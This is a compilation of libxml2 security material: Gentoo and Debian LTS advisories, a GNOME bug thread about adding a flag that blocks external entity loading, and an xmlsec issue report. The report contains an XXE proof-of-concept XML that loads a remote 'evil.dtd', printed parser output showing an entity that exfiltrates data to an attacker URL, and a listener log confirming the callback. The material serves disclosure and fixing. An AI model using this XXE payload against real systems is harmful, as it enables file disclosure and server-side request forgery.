# libxml2: Multiple vulnerabilities — GLSA **201711-01**

Multiple vulnerabilities have been found in libxml2, the worst of
which could result in the execution of arbitrary code.

### Affected packages

| Package | **dev-libs/libxml2** on all architectures |
| --- | --- |
| Affected versions | < **2.9.4-r3** |
| Unaffected versions | >= **2.9.4-r3** |

### Background

libxml2 is the XML (eXtended Markup Language) C parser and toolkit
initially developed for the Gnome project.

### Description

Multiple vulnerabilities have been discovered in libxml2. Please review
the CVE identifiers referenced below for details.

### Impact

A remote attacker, by enticing a user to process a specially crafted XML
document, could remotely execute arbitrary code, conduct XML External
Entity (XXE) attacks, or cause a Denial of Service condition.

### Workaround

There is no known workaround at this time.

### Resolution

All libxml2 users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-libs/libxml2-2.9.4-r3"

```

Packages which depend on this library may need to be recompiled. Tools
such as revdep-rebuild may assist in identifying some of these packages.

# Debian Long Term Support

Debian Long Term Support (LTS) is a project to extend the lifetime of all Debian stable releases to (at least) 5 years. Debian LTS is not handled by the Debian Security and Release teams, but by a separate group of volunteers and companies interested in making it a success.

Thus the Debian LTS team takes over security maintenance of the various releases once the Debian Security team stops its work.

Version        : 2.9.4+dfsg1-2.2+deb9u6
CVE ID         : CVE-2016-9318 CVE-2017-5130 CVE-2017-5969 CVE-2017-16932
                 CVE-2022-23308

Five security issues have been discovered in libxml2: XML C parser and toolkit.

CVE-2016-9318

    Vulnerable versions do not offer a flag directly indicating that the current
    document may be read but other files may not be opened, which makes it
    easier for remote attackers to conduct XML External Entity (XXE) attacks via
    a crafted document.

CVE-2017-5130

    Integer overflow in memory debug code, allowed a remote attacker to
    potentially exploit heap corruption via a crafted XML file.

CVE-2017-5969

    Parser in a recover mode allows remote attackers to cause a denial of service
    (NULL pointer dereference) via a crafted XML document.

CVE-2017-16932

    When expanding a parameter entity in a DTD, infinite recursion could lead to
    an infinite loop or memory exhaustion.

CVE-2022-23308

    the application that validates XML using xmlTextReaderRead() with
    XML_PARSE_DTDATTR and XML_PARSE_DTDVALID  enabled becomes vulnerable to this
    use-after-free bug. This issue can result in denial of service.

For Debian 9 stretch, these problems have been fixed in version
2.9.4+dfsg1-2.2+deb9u6.

We recommend that you upgrade your libxml2 packages.

For the detailed security status of libxml2 please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/libxml2>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be

But I don't understand why the existing test is not catching it, it seems to imply that within xmlsec1 context we have either XML_PARSE_DTDLOAD or XML_PARSE_DTDATTR or ctxt->replaceEntities or ctxt->validate. All of them asks for loading of DTDs and then fetching the external subset.  I wonder if we aren't activating XML_PARSE_DTDATTR to have the defaulted attributes from the DTD included in the canonical form, in which case I don't see how we could both prevent fetching external subset and be compliant with the spec. I think it's worth investigating because that mean the patch leads to a regression from an XML Sec POV.    Could you clarify ?      thanks,  Daniel ``` [Comment 3](show_bug.cgi?id=772726#c3)  Aleksey Sanin    2016-10-11 17:07:23 UTC  ``` The problem is also reproducible with xmllint. Thinking more about it, I think it is a valid scenario where one might want to parse the document, validate it, etc. but do not allow the parser to read any local or network files. I think the current patches (see the links in my first comment) are trying to guess the case when local/network access should be disabled based on other flags. I think it might be better to have an explicit (default?) flag that limits parser to only process the current file/memory block. What do you think? ``` [Comment 4](show_bug.cgi?id=772726#c4)  Matias Brutti    2016-10-11 18:22:11 UTC  ``` Daniel & Aleksey, I am the author of the bug reported to xmlsec1. I think the best path here is to make it secure by default and have an optional flag or method that allows the developer enable those whenever necessary, but the default behavior should be NOT to parse them. ``` [Comment 5](show_bug.cgi?id=772726#c5)  Matias Brutti    2016-10-31 19:26:15 UTC  ``` Has there been any update / decision on this bug ?

The way I understand the upstream xmlsec ticket, the problem here is external entity expansion specifically with respect to parameter entities - similar to CVE-2014-0191.  I believe the code referenced in [comment #0](show_bug.cgi?id=772726#c0) was originally introduced to address this CVE.  To reproduce the problem described @ xmlsec with xmllint, I need to use the --postvalid option.  With --postvalid, all the original CVE-2014-0191 reproducers are triggered, indicating that DTD validation does not correctly respect XML_PARSE_NOENT.  The patch in [comment 1](show_bug.cgi?id=772726#c1) does NOT change this behaviour.  I think the identified block in parser.c:xmlParserHandlePEReference() should begin:      // refuse to expand any entities if NOENT is not provided     // this is the same behaviour as expected for normal entities     if ((ctxt->options & XML_PARSE_NOENT) == 0))         return;  With this change:   - `xmllint --postvalid` no longer loads external parameter entities   - `xmllint --noent --nonet --postvalid` no longer loads external parameter entities from HTTP URLs, but it does load them from the filesystem   I don't really understand the rest of the flags, but I'm tempted to guess they should be joined with || instead of && in the test that's currently there.  That seems to make sense from my limited knowledge, except DTDATTR - I have no idea what that is doing here.                      if ((entity->etype == XML_EXTERNAL_PARAMETER_ENTITY) && (                           ((ctxt->options & XML_PARSE_NOENT) == 0) ||                           ((ctxt->options & XML_PARSE_DTDVALID) == 0) ||                           ((ctxt->options & XML_PARSE_DTDLOAD) == 0) ||                           ((ctxt->options & XML_PARSE_DTDATTR) == 0) ||                           (ctxt->replaceEntities == 0) ||                           (ctxt->validate == 0)))                         return;   I agree that a flag similar to NONET which disables fetching *all* external resources is a good idea.  This could be handled simply in xmlIO.c, prior to the XML_PARSE_NONET test.  That probably belongs on another ticket as RFE - getting NOENT honoured for parameter entities would be a good outcome for this one. ``` [Comment 10](show_bug.cgi?id=772726#c10)  dmoppert    2016-11-28 03:00:23 UTC  ``` To summarise my previous comment briefly, I think there are two bugs at play here:  #1:  XML_PARSE_NOENT=0 is not honoured for parameter entities when validating DTD  #2:  no means are provided to prevent expanding file-based entities, as XML_PARSE_NOENT=1 does for network-based entities ``` [Comment 11](show_bug.cgi?id=772726#c11)  Daniel Veillard    2016-11-28 10:52:30 UTC  ``` --postvalid of xmllint requires loading the DTD and hence is incompatible with --noent and equivalent, that's a fact of XML validation definition.  Think about it, you ask to validate against the DTD after parsing but you ask to not load the DTD, entities are defined in the DTD.  To validate with the DTD you *MUST* load entities, so 1 is obvious at least if understanding XML. XML_PARSE_NOENT is about all entities, local, remote alike.   W.r.t. patch    "`xmllint --postvalid` no longer loads external parameter entities"   then that's broken. If you ask to validate you must load the entities parameter or general ones.       Daniel ``` [Comment 12](show_bug.cgi?id=772726#c12)  dmoppert    2016-11-29 01:07:50 UTC  ``` > To validate with the DTD you *MUST* load entities  You're absolutely right - my point #1 didn't make any sense.  Sorry for the noise.  In reference to #2 (and [comment 3](show_bug.cgi?id=772726#c3)), is there a recommended way for clients to limit or disallow what external files can be opened?  A flag to altogether disable file-based entities might be too blunt for tools that need (for instance) to validate against a local store of DTDs.  If there's a way to control this in the existing API, xmlsec and other tools could surely benefit from it. ``` [Comment 13](show_bug.cgi?id=772726#c13)  Aleksey Sanin    2016-11-29 02:27:40 UTC  ``` > To validate with the DTD you *MUST* load entities  Correct, however for security reasons I might want to ONLY allow embedded references. I.e. for an XML file received from the user I don't want it to try to read files on local filesystem or remotely over the network. Of course, if external entities are present (and loading of remote entities is disabled) then this should result in an error. ``` [Comment 14](show_bug.cgi?id=772726#c14)  dmoppert    2016-12-01 07:03:41 UTC  ``` I have been looking for ways within the existing API to support the mode suggested in this ticket:  parsing a document (and optionally validating internal DTD) with entities being expanded, but forbidding the loading of any external entities, whether file-based or network-based.  My prototype adds a flag XML_PARSE_NOXXE, exposed via `xmllint --noxxe` for basic testing.  xmlSetExternalEntityLoader() looks like the right choice:  this is how XML_PARSE_NONET does its magic, so providing a similar function xmlNoXxeExternalEntityLoader() seems the right way to limit what external URIs libxml2 will open.  But I'm running into some difficulties; I hope you can provide some advice on how best to proceed (or if there's an altogether better approach).  The trouble I'm encountering is that xmlLoadExternalEntity() is used within xmlCreateURLParserCtxt(), setting up the parser for the initial document.  I want to allow this call, but forbid (by raising an error a la xmlNoNetExternalEntityHandler) calls that are actually for external entities.  Examining the ctxt structure in breakpoints, I can't see a field that confidently provides this information.  ctxt->external sounds right, but this is undermined by xmlParseExternalEntityPrivate() doing `ctxt->external = oldctxt->external`.    Questions:  #1 - does my approach seem sound?  #2 - is ctxt->external intended to give the information I want?  Patching xmlParseExternalEntityPrivate() doesn't seem to immediately cause any regressions, but I'm not sure this is right - and if it is, whether it should be set to 1 or 2.  #3 - if not ctxt->external, is there something else in ctxt that can be checked?   input_id is tempting, but I don't know if contexts can be re-used.  #4 - how should ExternalEntityHandler functions deal with ctxt==NULL?  I started by returning NULL after the pattern established in other functions, but ran into some errors in the Python test suite.   If I'm on the right track and can get some guidance on the above questions, I should be able to attach a working patch in the next few days and start working on proper test coverage.  Thanks! ``` [Comment 15](show_bug.cgi?id=772726#c15)  dmoppert    2016-12-13 01:56:19 UTC  ``` Created [attachment 341856](attachment.cgi?id=341856 "proposal for XML_PARSE_NOXXE") [[details]](attachment.cgi?id=341856&action=edit "proposal for XML_PARSE_NOXXE") [[review]](review?bug=772726&attachment=341856) proposal for XML_PARSE_NOXXE  Attached a proposed patch that uses (ctxt->input_id != 1) to determine whether an external reference is being resolved.  I'm not convinced this is the right approach, but (ctxt->external) did not give the results I expected.  Internally, this adds a flag XML_PARSE_NOXXE, exposed via xmllint as "-noxxe".  No regressions in the existing test suite, and passes my ad-hoc tests for XXE using xmllint.  Note that the patch doesn't depend on any libxml2 internals, so the same approach could be used by downstream projects like xmlsec without waiting on a new release of libxml2.  Assuming it's correct, or can be made so. ``` [Comment 16](show_bug.cgi?id=772726#c16)  Gengxiang Meng    2016-12-27 05:18:41 UTC  ``` I check the solution and have one confusion, the change in libxml/libxml2-2.9.4/xmlIO.c:  +        if (options & XML_PARSE_NOXXE) { +            ctxt->options -= XML_PARSE_NOXXE; +            ret = xmlNoNetExternalEntityLoader(URL, ID, ctxt); +            ctxt->options = options; +            return(ret); +        } +   should be change to:  +        if (options & XML_PARSE_NOXXE) { +            ctxt->options -= XML_PARSE_NOXXE; +            ret = xmlNoXxeExternalEntityLoader(URL, ID, ctxt); +            ctxt->options = options; +            return(ret); +        } +   Not sure, let me know if I am wrong, many thanks. ``` [Comment 17](show_bug.cgi?id=772726#c17)  dmoppert    2016-12-28 06:58:28 UTC  ``` Created [attachment 342521](attachment.cgi?id=342521 "proposal for XML_PARSE_NOXXE (updated)") [[details]](attachment.cgi?id=342521&action=edit "proposal for XML_PARSE_NOXXE (updated)") [[review]](review?bug=772726&attachment=342521) proposal for XML_PARSE_NOXXE (updated)  Gengxian Meng,  You are right - thanks for picking that up.

Also marking the bug as security once again.  To add the tests to `make check`, you'll need to update runtest.c (or one of the other 5 test tools:  runxmlconf, testapi, testchar, testdict, testrecurse) to add the test mode.  I suspect runtest.c will be the closest match.  I did a similar thing in [Bug 776895](show_bug.cgi?id=776895 "RESOLVED OBSOLETE - Add \"Schemas streaming regression tests\" to runtest in libxml2") (patch to be posted soon) where I added `make Schemastests` for `make tests`, and added support to runtest.c for "Schemas streaming regression tests" that did the same thing.  I'm actually not sure what the future direction of `make check` vs. `make tests` is, so I added it to both.  What I really want is a test mode where I can run the test case through xmllint, but specify the command-line switches to use in the test (or in a metadata file in the test directory).  Then we don't have to add all these single-mode test directories (even though some are very useful). ``` [Comment 25](show_bug.cgi?id=772726#c25)  Nick Wellnhofer    2017-06-05 21:41:55 UTC  ``` Maybe it makes more sense to tackle this at the parser level, not at the IO level. If XML_PARSE_NOXXE is set, the parser could simply refuse to call xmlLoadExternalEntity. ``` [Comment 26](show_bug.cgi?id=772726#c26)  Daniel Veillard    2017-06-08 20:31:51 UTC  ``` That might be the simplest indeed !   Daniel ``` [Comment 27](show_bug.cgi?id=772726#c27)  dmoppert    2017-06-15 03:56:20 UTC  ``` Created [attachment 353798](attachment.cgi?id=353798 "xxe test script") [[details]](attachment.cgi?id=353798&action=edit "xxe test script") xxe test script ``` [Comment 28](show_bug.cgi?id=772726#c28)  dmoppert    2017-06-15 04:17:23 UTC  ``` (ad-hoc, not integrated) Test script attached above.  Note that my most recent attempt at a patch still fails - I inverted the logic around using ctxt->external, causing xmllint to reject opening the initial file.  I expanded the test to also serve the input through a FIFO so each test can ensure that is read.  One problem I have struck is that xmlLoadExternalEntity() is called by xmlCreateURLParserCtxt() from xmlReadFile() to load the initial document.  This flailing about with ctxt fields has been trying to find a way to identify when xLEE() is being called for an actual external entity or not, but so far my attempts have gone awry. ``` [Comment 29](show_bug.cgi?id=772726#c29)  Nick Wellnhofer    2017-06-15 11:14:24 UTC  ``` > This flailing about with ctxt fields has been trying to find a way to identify when xLEE() is being called for an actual external entity or not, but so far my attempts have gone awry.  I simply don't see a way to do that without additional changes. ctxt->input_id doesn't work because some external entites are loaded with a fresh parser context, others are not. The fresh parser context is indistinguishable from the context used to load the initial document. ``` [Comment 30](show_bug.cgi?id=772726#c30)  Aleksey Sanin    2017-12-05 05:31:14 UTC  ``` Created [attachment 364995](attachment.cgi?id=364995 "(partial) fix for the XXE") [[details]](attachment.cgi?id=364995&action=edit "(partial) fix for the XXE") [[review]](review?bug=772726&attachment=364995) (partial) fix for the XXE  This solves at least part of the problems. ``` [Comment 31](show_bug.cgi?id=772726#c31)  Nikita Nirbhavane    2017-12-05 06:12:34 UTC  ``` Hi Aleksey,  That's great. This solves partial problems. When can we expect a complete fix for the vulnerability? ``` [Comment 32](show_bug.cgi?id=772726#c32)  Nick Wellnhofer    2017-12-05 10:48:17 UTC  ``` This isn't really a vulnerability. libxml2 only loads external entities if the user requests to substitute entities or to validate a document. In this case libxml2 has always given the user full control over which external entities are loaded. This bug is only about making it easier to completely suppress loading of external entities. ``` [Comment 33](show_bug.cgi?id=772726#c33)  Daniel Veillard    2017-12-08 08:47:34 UTC  ``` Okay, I checked through the code where one would create sub-parsers of existing parser or parsing outside the context of a normal parsing framework. I found a few other places where input_id ought to be increased or set higher than 1. Note that this wasn't used for entity snowballing detection but to make sure things like opening/closing constructs where happening in the same entity. That said not it should be usable in a reliable way for your purpose (Famous Last Words <grin/>)  Commited as   <https://git.gnome.org/browse/libxml2/commit/?id=ad88b54f1a28a8565964a370b5d387927b633c0d>  Aleksey, please give it a try, then I may try to push this month release !    thanks,  Daniel ``` [Comment 34](show_bug.cgi?id=772726#c34)  Aleksey Sanin    2017-12-08 15:33:31 UTC  ``` I just tried and all the test cases I know about are covered.

## Description

[![@mrbrutti](https://avatars.githubusercontent.com/u/15326?u=0e9f7964ab586619ed27e9969ca97dfa26808361&v=4&size=48)](/mrbrutti)[mrbrutti](https://github.com/mrbrutti)opened [on Oct 6, 2016](https://github.com/lsh123/xmlsec/issues/43#issue-181472807)
#### Description

An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.

Whenever xmlsec verifies, encrypt, decrypt an XML document the parse by default reads external entities resulting on an XXE Vulnerability.

#### Proof of Concept

```
$ cat input.xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://192.168.3.1/evil.dtd"> %remote;]>

```

Running a fake command to test:

```
matt at バトー in /tmp
$ xmlsec1 --verify --output /tmp/output.xml /tmp/input.xml
http://23.252.63.90/evil.dtd:1: parser warning : not validating will not read content for PE entity data
passwd"><!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://192.168.3.2/?%data;'>"
                                                                               ^
/tmp/input.xml:2: parser error : Start tag expected, '<' not found

^
Error: failed to parse xml file "/tmp/input.xml"
Error: failed to load document "/tmp/input.xml"
ERROR
SignedInfo References (ok/all): 0/0
Manifests References (ok/all): 0/0
Error: failed to verify file "/tmp/input.xml"
```
##### Listener:

```
❯❯❯ ruby server_only.rb
Puma 2.14.0 starting...
* Min threads: 0, max threads: 16
* Environment: development
* Listening on tcp://192.168.3.1:80
== Sinatra (v1.4.6) has taken the stage on 80 for development with backup from Puma
The Server is Vulnerable | IP 192.168.3.2 | Path /evil.dtd
The Server is Vulnerable | IP 192.168.3.2 | Path /evil.dtd
The Server is Vulnerable | IP 192.168.3.2 | Path /evil.dtd
```

Note: The same results were found as a result of trying to encrypt or decyrpt content.

#### Recommendations

It is my recommendation that the xmlsec library by default denies External Entities and local file inclusion and/or provides a command line option that can be used to block them.
